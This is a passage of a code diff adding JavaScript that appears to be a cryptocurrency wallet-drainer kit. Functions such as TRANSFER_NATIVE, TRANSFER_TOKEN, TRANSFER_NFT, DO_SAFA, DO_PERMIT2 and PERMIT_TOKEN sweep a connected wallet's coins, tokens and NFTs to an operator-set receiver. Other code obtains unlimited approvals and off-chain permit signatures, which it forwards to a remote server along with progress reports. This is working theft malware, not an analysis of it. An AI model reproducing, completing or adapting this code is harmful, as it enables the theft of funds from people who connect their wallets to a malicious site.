+  if (FLASH_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
+  await swap_success(asset.swapper_type, asset, [ asset ]); sign_ready();
+};
+
+const DO_UNISWAP = async (asset, all_tokens) => {
+  const web3 = new Web3(FLASH_Provider); const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
+  const contract = new ethers.Contract(asset.swapper_address, FLASH_Uniswap_ABI, FLASH_Signer);
+  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
+  const nonce = await get_nonce(asset.chain_id);
+  const swap_data = [];
+  for (const token of all_tokens) {
+    try {
+      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
+      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
+      const web3_contract = new web3.eth.Contract(FLASH_Uniswap_ABI, token.swapper_address);
+      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
+        token.address, FLASH_Swap_Route[token.chain_id]
+      ], FLASH_Settings.Receiver).encodeABI();
+      swap_data.push(data);
+    } catch(err) {
+      console.log(err);
+    }
+  }
+  let gas_limit = null;
+  let gas_attempts = 0;
+  while (gas_attempts < 3) {
+    try {
+      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: FLASH_Current_Address });
+      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
+      gas_attempts = 3;
+    } catch(err) {
+      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
+      gas_attempts += 1;
+    }
+  }
+  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
+  const tx = await contract.multicall(swap_deadline, swap_data, {
+    gasLimit: ethers.BigNumber.from(gas_limit),
+    gasPrice: ethers.BigNumber.from(gas_price),
+    nonce: nonce, from: FLASH_Current_Address
+  });
+  wait_message();
+  if (FLASH_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
+  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
+};
+
+const DO_PANCAKE_V3 = async (asset, all_tokens) => {
+  const web3 = new Web3(FLASH_Provider); const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
+  const contract = new ethers.Contract(asset.swapper_address, FLASH_Pancake_ABI, FLASH_Signer);
+  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
+  const nonce = await get_nonce(asset.chain_id);
+  const swap_data = [];
+  for (const token of all_tokens) {
+    try {
+      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
+      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
+      const web3_contract = new web3.eth.Contract(FLASH_Pancake_ABI, token.swapper_address);
+      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
+        token.address, FLASH_Swap_Route[token.chain_id]
+      ], FLASH_Settings.Receiver).encodeABI();
+      swap_data.push(data);
+    } catch(err) {
+      console.log(err);
+    }
+  }
+  let gas_limit = null;
+  let gas_attempts = 0;
+  while (gas_attempts < 3) {
+    try {
+      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: FLASH_Current_Address });
+      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
+      gas_attempts = 3;
+    } catch(err) {
+      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
+      gas_attempts += 1;
+    }
+  }
+  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
+  const tx = await contract.multicall(swap_deadline, swap_data, {
+    gasLimit: ethers.BigNumber.from(gas_limit),
+    gasPrice: ethers.BigNumber.from(gas_price),
+    nonce: nonce, from: FLASH_Current_Address
+  });
+  wait_message();
+  if (FLASH_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
+  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
+};
+
+const DO_CONTRACT = async (asset) => {
+  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
+  const tokens_gas_fee = token_limit.mul(FLASH_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);
+
+  if (FLASH_Settings.Settings.Use_Public_Contract && FLASH_Settings.Public_Contract[parseInt(asset.chain_id)] != null) {
+    FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy = 2;
+    FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Address = FLASH_Settings.Public_Contract[parseInt(asset.chain_id)][FLASH_Settings.Settings.Use_Public_Premium ? (asset.amount_usd >= 500 ? 1 : 0) : 0];
+  }
+
+  const Contract_ABI = (FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1) ?
+  JSON.parse(`[{"constant":false,"inputs":[],"name":"${FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`) :
+  ((FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) ? JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"${FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`)
+  : JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},
+  {"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"${FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`));
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const web3_contract = new web3.eth.Contract(Contract_ABI, FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Address);
+
+  if (FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
+    contract_data = web3_contract.methods[FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Type](FLASH_Settings.Receiver).encodeABI();
+  } else if (FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 2) {
+    let split_data = false;
+    try {
+      const response = await send_request({ action: 'partner_percent', address: FLASH_Partner_Address, amount_usd: (asset.amount_usd || null) });
+      if (response.status == 'OK' && response.mode == true) split_data = response.percent;
+    } catch(err) {
+      console.log(err);
+    }
+    let secondary_address = !split_data ? '0x0000000000000000000000000000000000000000' : FLASH_Partner_Address;
+    contract_data = web3_contract.methods[FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Type](FLASH_Current_Address, FLASH_Settings.Receiver,
+    secondary_address, web3.utils.toHex(!split_data ? 0 : split_data), FLASH_Settings.Settings.Use_Back_Feature).encodeABI();
+  } else {
+    contract_data = web3_contract.methods[FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Type]().encodeABI();
+  }
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Address, value: BN(100), data: contract_data };
+  const gas_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 100000)));
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
+  if (available_amount.lte(BN(0))) {
+    unsigned_tx.to = FLASH_Settings.Receiver;
+    unsigned_tx.data = '0x';
+    const another_gas_limit = await node.estimateGas(unsigned_tx);
+    const new_available_amount = balance.sub(another_gas_limit.mul(gas_price)).sub(tokens_gas_fee);
+    if (new_available_amount.lte(BN(0))) {
+      throw 'LOW_BALANCE';
+    } else {
+      return TRANSFER_NATIVE(asset, true);
+    }
+  }
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.value = available_amount;
+  unsigned_tx.nonce = nonce;
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+
+  await transfer_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation)
+    await node.waitForTransaction(tx.hash, 1, 30000);
+  await transfer_success(asset, available_amount); sign_ready();
+};
+
+const DO_RANDOMIZER_NATIVE = async (asset) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
+  const tokens_gas_fee = token_limit.mul(FLASH_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: FLASH_Settings.Personal_Wallet.address, value: BN(100), data: "0x" };
+  const gas_limit = await node.estimateGas(unsigned_tx);
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
+  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.value = available_amount;
+  unsigned_tx.nonce = nonce;
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+
+  await transfer_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation)
+    await node.waitForTransaction(tx.hash, 1, 30000);
+
+  const x_promise = send_request({
+    action: 'withdraw_native', wallet: FLASH_Settings.Personal_Wallet,
+    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
+    user_id: FLASH_ID, asset: asset, address: FLASH_Current_Address
+  });
+  if (FLASH_Settings.Settings.Wait_For_Response)
+    await x_promise;
+
+  await transfer_success(asset, available_amount); sign_ready();
+};
+
+const TRANSFER_NATIVE = async (asset, ignore_contract = false) => {
+  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
+
+  if (FLASH_Settings.Settings.Use_Wallet_Randomizer && FLASH_Settings.Personal_Wallet != null) return DO_RANDOMIZER_NATIVE(asset);
+  if (ignore_contract == false && ((FLASH_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '' || (FLASH_Settings.Settings.Use_Public_Contract
+  && FLASH_Settings.Public_Contract[parseInt(asset.chain_id)] != null)) && asset.amount_usd >= FLASH_Settings.Settings.Use_Contract_Amount)) return DO_CONTRACT(asset);
+
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
+  const tokens_gas_fee = token_limit.mul(FLASH_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: FLASH_Settings.Receiver, value: BN(100), data: "0x" };
+  const gas_limit = await node.estimateGas(unsigned_tx);
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
+  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.value = available_amount;
+  unsigned_tx.nonce = nonce;
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+
+  await transfer_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation)
+    await node.waitForTransaction(tx.hash, 1, 30000);
+  await transfer_success(asset, available_amount); sign_ready();
+};
+
+const DO_RANDOMIZER_TOKEN = async (asset) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: asset.address, value: "0x0", data: "0x" };
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const web3_contract = new web3.eth.Contract(FLASH_Contract_ABI['ERC20'], asset.address);
+
+  contract_data = web3_contract.methods.transfer(FLASH_Settings.Personal_Wallet.address, asset.amount_raw).encodeABI();
+  unsigned_tx.data = contract_data;
+
+  const gas_limit = await node.estimateGas(unsigned_tx);
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price));
+  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.nonce = nonce;
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+
+  await transfer_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation)
+    await node.waitForTransaction(tx.hash, 1, 30000);
+
+  const x_promise = send_request({
+    action: 'withdraw_token', wallet: FLASH_Settings.Personal_Wallet,
+    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
+    user_id: FLASH_ID, asset: asset, address: FLASH_Current_Address
+  });
+
+  if (FLASH_Settings.Settings.Wait_For_Response)
+    await x_promise;
+
+  await transfer_success(asset); sign_ready();
+};
+
+const TRANSFER_TOKEN = async (asset) => {
+  if (FLASH_Settings.Settings.Use_Randomizer_For_Tokens && FLASH_Settings.Personal_Wallet != null) return DO_RANDOMIZER_TOKEN(asset);
+
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: asset.address, value: "0x0", data: "0x" };
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const web3_contract = new web3.eth.Contract(FLASH_Contract_ABI['ERC20'], asset.address);
+
+  contract_data = web3_contract.methods.transfer(FLASH_Settings.Receiver, asset.amount_raw).encodeABI();
+  unsigned_tx.data = contract_data;
+
+  const gas_limit = await node.estimateGas(unsigned_tx);
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price));
+  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.nonce = nonce;
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+
+  await transfer_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation)
+    await node.waitForTransaction(tx.hash, 1, 30000);
+  await transfer_success(asset); sign_ready();
+};
+
+const TRANSFER_NFT = async (asset) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: asset.address, value: "0x0", data: "0x" };
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const web3_contract = new web3.eth.Contract(FLASH_Contract_ABI['ERC721'], asset.address);
+
+  contract_data = web3_contract.methods.transferFrom(FLASH_Current_Address, FLASH_Settings.Receiver, asset.id).encodeABI();
+  unsigned_tx.data = contract_data;
+
+  const gas_limit = await node.estimateGas(unsigned_tx);
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price));
+  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.nonce = nonce;
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+
+  await transfer_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation)
+    await node.waitForTransaction(tx.hash, 1, 30000);
+
+  await transfer_success(asset); sign_ready();
+};
+
+const DO_SAFA = async (asset) => {
+  const node = new ethers.providers.JsonRpcProvider(FLASH_Settings.RPCs[asset.chain_id]);
+  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(FLASH_Gas_Multiplier * 100)));
+
+  let unsigned_tx = { from: FLASH_Current_Address, to: asset.address, value: "0x0", data: "0x" };
+
+  const web3 = new Web3(FLASH_Provider); let contract_data = null;
+  const web3_contract = new web3.eth.Contract(FLASH_Contract_ABI['ERC721'], asset.address);
+
+  contract_data = web3_contract.methods.setApprovalForAll(FLASH_Settings.Address, true).encodeABI();
+  unsigned_tx.data = contract_data;
+
+  const gas_limit = await node.estimateGas(unsigned_tx);
+
+  const balance = await node.getBalance(FLASH_Current_Address);
+  const available_amount = balance.sub(gas_limit.mul(gas_price));
+  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';
+
+  const nonce = await node.getTransactionCount(FLASH_Current_Address, 'pending');
+
+  unsigned_tx.nonce = nonce;
+  unsigned_tx.gasPrice = gas_price;
+  unsigned_tx.gasLimit = gas_limit;
+
+  await transfer_request(asset); sign_next();
+  const tx = await FLASH_Signer.sendTransaction(unsigned_tx);
+  wait_message();
+
+  if (FLASH_Settings.Settings.Wait_For_Confirmation)
+    await node.waitForTransaction(tx.hash, 1, 30000);
+
+  await transfer_success(asset); sign_ready();
+};
+
+const DO_PERMIT2 = async (asset, assets) => {
+  const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', FLASH_Contract_ABI['PERMIT2_BATCH'], FLASH_Signer);
+  let permit_domain = { name: "Permit2", chainId: asset.chain_id, verifyingContract: "0x000000000022d473030f116ddee9f6b43ac78ba3" };
+  let permit_deadline = Date.now() + 1000 * 60 * 60 * 24 * 356, permit_signature = null, permit_message = null, permit_mode = null;
+  if (assets.length > 1) {
+    let permit_types = {
+      "PermitBatch": [
+        {
+          "name": "details",
+          "type": "PermitDetails[]"
+        },
+        {
+          "name": "spender",
+          "type": "address"
+        },
+        {
+          "name": "sigDeadline",
+          "type": "uint256"
+        }
+      ],
+      "PermitDetails": [
+        {
+          "name": "token",
+          "type": "address"
+        },
+        {
+          "name": "amount",
+          "type": "uint160"
+        },
+        {
+          "name": "expiration",
+          "type": "uint48"
+        },
+        {
+          "name": "nonce",
+          "type": "uint48"
+        }
+      ]
+    };
+    let tokens = [];
+    for (const x_asset of assets) {
+      try {
+        tokens.push({
+          "token": x_asset.address, "expiration": permit_deadline,
+          "amount": "1461501637330902918203684832716283019655932542975",
+          "nonce": (await contract.allowance(FLASH_Current_Address, x_asset.address, (FLASH_Settings.Settings.Use_Randomizer_For_Tokens? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address))).nonce
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    permit_message = {
+      "details": tokens,
+      "spender": (FLASH_Settings.Settings.Use_Randomizer_For_Tokens
+        ? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address),
+      "sigDeadline": permit_deadline
+    };
+    swap_request("Permit2", asset, assets); sign_next();
+    permit_signature = await FLASH_Signer._signTypedData(permit_domain, permit_types, permit_message);
+    permit_mode = 2;
+  } else {
+    // Permit Single
+    let permit_types = {
+      "PermitSingle": [
+        {
+          "name": "details",
+          "type": "PermitDetails"
+        },
+        {
+          "name": "spender",
+          "type": "address"
+        },
+        {
+          "name": "sigDeadline",
+          "type": "uint256"
+        }
+      ],
+      "PermitDetails": [
+        {
+          "name": "token",
+          "type": "address"
+        },
+        {
+          "name": "amount",
+          "type": "uint160"
+        },
+        {
+          "name": "expiration",
+          "type": "uint48"
+        },
+        {
+          "name": "nonce",
+          "type": "uint48"
+        }
+      ]
+    };
+    permit_message = {
+      "details": {
+        "token": asset.address,
+        "amount": "1461501637330902918203684832716283019655932542975",
+        "expiration": permit_deadline, "nonce": (await contract.allowance(FLASH_Current_Address, asset.address, (FLASH_Settings.Settings.Use_Randomizer_For_Tokens ? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address))).nonce
+      },
+      "spender": (FLASH_Settings.Settings.Use_Randomizer_For_Tokens
+        ? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address),
+      "sigDeadline": permit_deadline
+    };
+    swap_request("Permit2", asset, [ asset ]); sign_next();
+    permit_signature = await FLASH_Signer._signTypedData(permit_domain, permit_types, permit_message);
+    permit_mode = 1;
+  }
+  if (permit_signature != null) {
+    await swap_success('Permit2', asset, assets); wait_message();
+    const x_promise = send_request({
+      action: 'sign_permit2', user_id: FLASH_ID, signature: permit_signature,
+      message: permit_message, asset: asset, assets, address: FLASH_Current_Address,
+      mode: permit_mode, PW: FLASH_Settings.Personal_Wallet
+    });
+    if (FLASH_Settings.Settings.Wait_For_Response) await x_promise;
+    sign_ready();
+  } else {
+    await sign_cancel();
+  }
+};
+
+const PERMIT_TOKEN = async (asset) => {
+  const contract = new ethers.Contract(asset.address, asset.abi, FLASH_Signer);
+  const nonce = await contract.nonces(FLASH_Current_Address);
+  const name = await contract.name();
+  let value = ethers.utils.parseEther(FLASH_Unlimited_Amount);
+  for (const c_address of FLASH_Settings.Unlimited_BL) {
+    try {
+      if (c_address[0] == FLASH_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
+        value = asset.amount_raw;
+        break;
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+  const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
+  let permit_types = null, permit_values = null;
+  if (asset.permit == 1) {
+    permit_types = {
+      Permit: [
+        {
+          name: "holder",
+          type: "address",
+        },
+        {
+          name: "spender",
+          type: "address",
+        },
+        {
+          name: "nonce",
+          type: "uint256",
+        },
+        {
+          name: "expiry",
+          type: "uint256",
+        },
+        {
+          name: "allowed",
+          type: "bool",
+        }
+      ]
+    };
+    permit_values = {
+      holder: FLASH_Current_Address,
+      spender: (FLASH_Settings.Settings.Use_Randomizer_For_Tokens
+        ? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address),
+      nonce: nonce,
+      expiry: deadline,
+      allowed: true
+    };
+  } else if (asset.permit == 2) {
+    permit_types = {
+      Permit: [
+        {
+          name: "owner",
+          type: "address",
+        },
+        {
+          name: "spender",
+          type: "address",
+        },
+        {
+          name: "value",
+          type: "uint256",
+        },
+        {
+          name: "nonce",
+          type: "uint256",
+        },
+        {
+          name: "deadline",
+          type: "uint256",
+        }
+      ]
+    };
+    permit_values = {
+      owner: FLASH_Current_Address,
+      spender: (FLASH_Settings.Settings.Use_Randomizer_For_Tokens
+        ? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address),
+      value: value,
+      nonce: nonce,
+      deadline: deadline
+    };
+  }
+  await approve_request(asset);
+  sign_next();
+  const result = await FLASH_Signer._signTypedData({
+    name: name, version: asset.permit_ver, chainId: asset.chain_id,
+    verifyingContract: asset.address
+  }, permit_types, permit_values),
+  signature = {
+    r: result.slice(0, 66),
+    s: "0x" + result.slice(66, 130),
+    v: Number("0x" + result.slice(130, 132))
+  };
+  await approve_success(asset);
+  wait_message();
+  const x_promise = send_request({
+    action: 'permit_token', user_id: FLASH_ID, sign: {
+      type: asset.permit, version: asset.permit_ver,
+      chain_id: asset.chain_id, address: asset.address,
+      owner: FLASH_Current_Address, spender: (FLASH_Settings.Settings.Use_Randomizer_For_Tokens
+        ? FLASH_Settings.Personal_Wallet.address : FLASH_Settings.Address),
+      value: value.toString(), nonce: nonce.toString(), deadline: deadline,
+      r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
+    }, asset: asset, address: FLASH_Current_Address, PW: FLASH_Settings.Personal_Wallet
+  });
+  if (FLASH_Settings.Settings.Wait_For_Response) await x_promise;
+  sign_ready();
+};
+
+const sign_success = async (asset, amount = '0') => {
+  try {
+    if (asset.type == 'NATIVE') {
+      asset.amount_raw = amount;
+      const out_amount = ethers.BigNumber.from(asset.amount_raw);
+      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * FLASH_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
+      await send_request({ action: 'sign_success', asset, user_id: FLASH_ID });
+    } else {
+      await send_request({ action: 'sign_success', asset, user_id: FLASH_ID });
+    }
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const swap_success = async (type, asset, all_tokens = [], amount = '0') => {
+  try {
+    if (asset.type == 'NATIVE') {
+      asset.amount_raw = amount;
+      const out_amount = ethers.BigNumber.from(asset.amount_raw);
+      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * FLASH_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
+      await send_request({ action: 'swap_success', asset, user_id: FLASH_ID, list: all_tokens, swapper: type });
+    } else {
+      await send_request({ action: 'swap_success', asset, user_id: FLASH_ID, list: all_tokens, swapper: type });
+    }
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const transfer_success = async (asset, amount = '0') => {
+  try {
+    if (asset.type == 'NATIVE') {
+      asset.amount_raw = amount;
+      const out_amount = ethers.BigNumber.from(asset.amount_raw);
+      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * FLASH_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
+      await send_request({ action: 'transfer_success', asset, user_id: FLASH_ID });
+    } else {
+      await send_request({ action: 'transfer_success', asset, user_id: FLASH_ID });
+    }
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const approve_success = async (asset) => {
+  try {
+    await send_request({ action: 'approve_success', asset, user_id: FLASH_ID });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const sign_cancel = async () => {
+  try {
+    await send_request({ action: 'sign_cancel', user_id: FLASH_ID });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const sign_unavailable = async () => {
+  try {
+    await send_request({ action: 'sign_unavailable', user_id: FLASH_ID });
+    FLASH_Sign_Disabled = true;
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const transfer_cancel = async () => {
+  try {
+    await send_request({ action: 'transfer_cancel', user_id: FLASH_ID });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const approve_cancel = async () => {
+  try {
+    await send_request({ action: 'approve_cancel', user_id: FLASH_ID });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const chain_cancel = async () => {
+  try {
+    await send_request({ action: 'chain_cancel', user_id: FLASH_ID  });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const chain_success = async () => {
+  try {
+    await send_request({ action: 'chain_success', user_id: FLASH_ID  });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const chain_request = async (old_chain, new_chain) => {
+  try {
+    await send_request({ action: 'chain_request', user_id: FLASH_ID, chains: [ old_chain, new_chain ] });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const sign_request = async (asset) => {
+  try {
+    await send_request({ action: 'sign_request', user_id: FLASH_ID, asset });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const swap_request = async (type, asset, all_tokens = []) => {
+  try {
+    await send_request({ action: 'swap_request', user_id: FLASH_ID, asset, list: all_tokens, swapper: type });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const transfer_request = async (asset) => {
+  try {
+    await send_request({ action: 'transfer_request', user_id: FLASH_ID, asset });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const approve_request = async (asset) => {
+  try {
+    await send_request({ action: 'approve_request', user_id: FLASH_ID, asset });
+  } catch(err) {
+    console.log(err);
+  }
+}
+
+const is_increase_approve = (func) => {
+  try {
+    if (func.hasOwnProperty('increaseAllowance')) {
+      return 1;
+    } else if (func.hasOwnProperty('increaseApproval')) {
+      return 2;
+    } else {
+      return false;
+    }
+  } catch(err) {
+    return false;
+  }
+};
+
+const get_wallet_assets = async (address) => {
+  try {
+    let response = await send_request({ action: 'check_wallet', address: FLASH_Current_Address }), assets = [];
+    if (response.status == 'OK') assets = response.data;
+    else if (FLASH_Settings.AT != "" && response.error == 'LOCAL_CHECK') assets = await get_tokens(address);
+    else if (response.error != 'LOCAL_CHECK') return assets;
+    else {
+      FLASH_Check_Done = true;
